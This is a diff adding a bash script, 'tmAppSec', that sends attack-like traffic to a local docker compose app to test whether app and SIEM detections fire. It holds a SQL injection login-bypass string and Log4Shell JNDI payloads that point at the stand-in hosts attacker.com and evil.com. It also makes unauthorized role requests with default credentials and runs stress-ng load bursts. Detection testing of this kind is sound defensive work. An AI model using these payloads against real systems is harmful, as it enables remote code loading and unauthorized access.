@@ -1,0 +1,261 @@
+#!/usr/bin/env bash
+set -euo pipefail
+
+########################################
+# Defaults (override via CLI options)
+########################################
+COMPOSE_BIN="docker compose"
+CURL_SVC="curl"
+STRESS_SVC="stress"
+BASE_URL="http://server-app"
+LDAP_HOST_1="attacker.com"
+LDAP_HOST_2="evil.com"
+
+########################################
+# Helpers
+########################################
+dc_exec() {
+  # Usage: dc_exec <service> <command...>
+  $COMPOSE_BIN exec -T "$1" "${@:2}"
+}
+
+print_header() {
+  clear || true
+  echo " _                               _           "
+  echo "| |                             | |          "
+  echo "| |_ _ __ ___   __ _ _ __  _ __ | | ___  ___ "
+  echo "| __| '_ \` _ \ / _\` | '_ \| '_ \| |/ _ \/ __|"
+  echo "| |_| | | | | | (_| | |_) | |_) | |  __/\__ \\"
+  echo " \__|_| |_| |_|\__,_| .__/| .__/|_|\___||___/"
+  echo "                    | |   | |                "
+  echo "                    |_|   |_|                "
+  echo
+  echo "tmAppSec - App/SIEM detection tester (docker compose exec)"
+  echo
+  echo "Compose: $COMPOSE_BIN"
+  echo "Curl svc: $CURL_SVC | Stress svc: $STRESS_SVC"
+  echo "Base URL: $BASE_URL"
+  echo
+}
+
+########################################
+# Test names
+########################################
+test_sqli_name="SQL Injection (CVE-2000-1209 style) - login bypass"
+test_struts_name="Apache Struts2 (CVE-2017-5638 style) - multipart POST"
+test_log4shell_q_name="Log4Shell (CVE-2021-44228) - jndi in query param"
+test_log4shell_ua_name="Log4Shell (CVE-2021-44228) - jndi in User-Agent"
+test_roles_emp_name="Roles - employee (authorized/unauthorized paths)"
+test_roles_admin_name="Roles - admin (authorized paths)"
+test_roles_user_name="Roles - user (unauthorized paths)"
+test_stress_cpu_name="stress-ng CPU burst"
+test_stress_vm1_name="stress-ng VM 512M"
+test_stress_vm2_name="stress-ng VM 80%"
+test_stress_hdd_name="stress-ng HDD write"
+
+########################################
+# Tests (the actual actions)
+########################################
+
+test_sqli() {
+  # your example:
+  # curl "http://server-app/login?user=admin&pass=%27%20OR%201%3D1"
+  dc_exec "$CURL_SVC" curl -sS "${BASE_URL}/login?user=admin&pass=%27%20OR%201%3D1" >/dev/null
+}
+
+test_struts() {
+  # NOTE: Real CVE-2017-5638 is a OGNL injection via Content-Type header.
+  # Here we keep your "multipart/form-data" POST style test trigger.
+  dc_exec "$CURL_SVC" curl -sS -X POST \
+    -H "Content-Type: multipart/form-data" \
+    -F "file=@/etc/hosts" \
+    "${BASE_URL}/" >/dev/null
+}
+
+test_log4shell_q() {
+  # your example:
+  # /search?q=${jndi:ldap://attacker.com/...}
+  # We keep it URL-friendly; curl will pass it as-is if quoted.
+  dc_exec "$CURL_SVC" curl -sS \
+    "${BASE_URL}/search?q=\${jndi:ldap://${LDAP_HOST_1}/Monsieur_On_veut_20_Sur_20}" >/dev/null
+}
+
+test_log4shell_ua() {
+  dc_exec "$CURL_SVC" curl -sS -v \
+    -H "User-Agent: \${jndi:ldap://${LDAP_HOST_2}/Coucou_C_est_Moi}" \
+    "${BASE_URL}/" >/dev/null 2>&1 || true
+}
+
+test_roles_employee() {
+  # Logged as an employee
+  dc_exec "$CURL_SVC" curl -sS -u employee:employee "${BASE_URL}/employee" >/dev/null
+  dc_exec "$CURL_SVC" curl -sS -u employee:employee "${BASE_URL}/user" >/dev/null
+  # unauthorized => should alert
+  dc_exec "$CURL_SVC" curl -sS -u employee:employee "${BASE_URL}/admin" >/dev/null || true
+}
+
+test_roles_admin() {
+  # Logged as an Admin
+  dc_exec "$CURL_SVC" curl -sS -u admin:admin "${BASE_URL}/employee" >/dev/null
+  dc_exec "$CURL_SVC" curl -sS -u admin:admin "${BASE_URL}/user" >/dev/null
+  dc_exec "$CURL_SVC" curl -sS -u admin:admin "${BASE_URL}/admin" >/dev/null
+}
+
+test_roles_user() {
+  # Logged as a normal User
+  dc_exec "$CURL_SVC" curl -sS -u user:user "${BASE_URL}/user" >/dev/null
+  # unauthorized => should alert
+  dc_exec "$CURL_SVC" curl -sS -u user:user "${BASE_URL}/employee" >/dev/null || true
+  dc_exec "$CURL_SVC" curl -sS -u user:user "${BASE_URL}/admin" >/dev/null || true
+}
+
+test_stress_cpu() {
+  dc_exec "$STRESS_SVC" stress-ng --cpu 8 --timeout 30 --metrics-brief
+}
+
+test_stress_vm1() {
+  dc_exec "$STRESS_SVC" stress-ng --vm 4 --vm-bytes 512M --timeout 30 --metrics-brief
+}
+
+test_stress_vm2() {
+  dc_exec "$STRESS_SVC" stress-ng --vm 2 --vm-bytes 80% --timeout 30 --metrics-brief
+}
+
+test_stress_hdd() {
+  dc_exec "$STRESS_SVC" stress-ng --hdd 4 --hdd-write --timeout 30 --metrics-brief
+}
+
+run_all() {
+  test_sqli
+  test_struts
+  test_log4shell_q
+  test_log4shell_ua
+  test_roles_employee
+  test_roles_admin
+  test_roles_user
+  test_stress_cpu
+  test_stress_vm1
+  test_stress_vm2
+  test_stress_hdd
+}
+
+########################################
+# Arg parsing (simple)
+########################################
+show_list() {
+  cat <<EOF
+
+Available tests:
+
+  -1  $test_sqli_name
+  -2  $test_struts_name
+  -3  $test_log4shell_q_name
+  -4  $test_log4shell_ua_name
+  -5  $test_roles_emp_name
+  -6  $test_roles_admin_name
+  -7  $test_roles_user_name
+  -8  $test_stress_cpu_name
+  -9  $test_stress_vm1_name
+  -10 $test_stress_vm2_name
+  -11 $test_stress_hdd_name
+  -99 Run all
+
+Options:
+  --compose "<docker compose ...>"  (default: "docker compose")
+  --svc <service>                  (default: curl)
+  --stress-svc <service>           (default: stress)
+  --base <url>                     (default: http://server-app)
+  --ldap1 <host>                   (default: attacker.com)
+  --ldap2 <host>                   (default: evil.com)
+
+Examples:
+  ./tmappsec.sh -3
+  ./tmappsec.sh --base http://server-app -1 -5
+  ./tmappsec.sh --svc curl --stress-svc stress -99
+
+EOF
+}
+
+# Parse long options first
+ARGS=()
+while [[ $# -gt 0 ]]; do
+  case "$1" in
+    --compose) COMPOSE_BIN="$2"; shift 2 ;;
+    --svc) CURL_SVC="$2"; shift 2 ;;
+    --stress-svc) STRESS_SVC="$2"; shift 2 ;;
+    --base) BASE_URL="$2"; shift 2 ;;
+    --ldap1) LDAP_HOST_1="$2"; shift 2 ;;
+    --ldap2) LDAP_HOST_2="$2"; shift 2 ;;
+    --list|-l|--help|-h) show_list; exit 0 ;;
+    *) ARGS+=("$1"); shift ;;
+  esac
+done
+
+set -- "${ARGS[@]}"
+
+########################################
+# Interactive mode if no args
+########################################
+if [[ $# -eq 0 ]]; then
+  while true; do
+    options=(
+      "$test_sqli_name"
+      "$test_struts_name"
+      "$test_log4shell_q_name"
+      "$test_log4shell_ua_name"
+      "$test_roles_emp_name"
+      "$test_roles_admin_name"
+      "$test_roles_user_name"
+      "$test_stress_cpu_name"
+      "$test_stress_vm1_name"
+      "$test_stress_vm2_name"
+      "$test_stress_hdd_name"
+      "CHAOS! RUN ALL!"
+      "Quit!"
+    )
+
+    print_header
+    echo "Choose a test:"
+    echo
+
+    select opt in "${options[@]}"; do
+      case $REPLY in
+        1) test_sqli; break ;;
+        2) test_struts; break ;;
+        3) test_log4shell_q; break ;;
+        4) test_log4shell_ua; break ;;
+        5) test_roles_employee; break ;;
+        6) test_roles_admin; break ;;
+        7) test_roles_user; break ;;
+        8) test_stress_cpu; break ;;
+        9) test_stress_vm1; break ;;
+        10) test_stress_vm2; break ;;
+        11) test_stress_hdd; break ;;
+        12) run_all; break ;;
+        13) exit 0 ;;
+        *) echo "Invalid option!" >&2 ;;
+      esac
+    done
+  done
+fi
+
+########################################
+# Script mode: run selected tests
+########################################
+for arg in "$@"; do
+  case "$arg" in
+    -1) test_sqli ;;
+    -2) test_struts ;;
+    -3) test_log4shell_q ;;
+    -4) test_log4shell_ua ;;
+    -5) test_roles_employee ;;
+    -6) test_roles_admin ;;
+    -7) test_roles_user ;;
+    -8) test_stress_cpu ;;
+    -9) test_stress_vm1 ;;
+    -10) test_stress_vm2 ;;
+    -11) test_stress_hdd ;;
+    -99) run_all ;;
+    *) echo "Unknown arg: $arg" >&2; show_list; exit 1 ;;
+  esac
+done
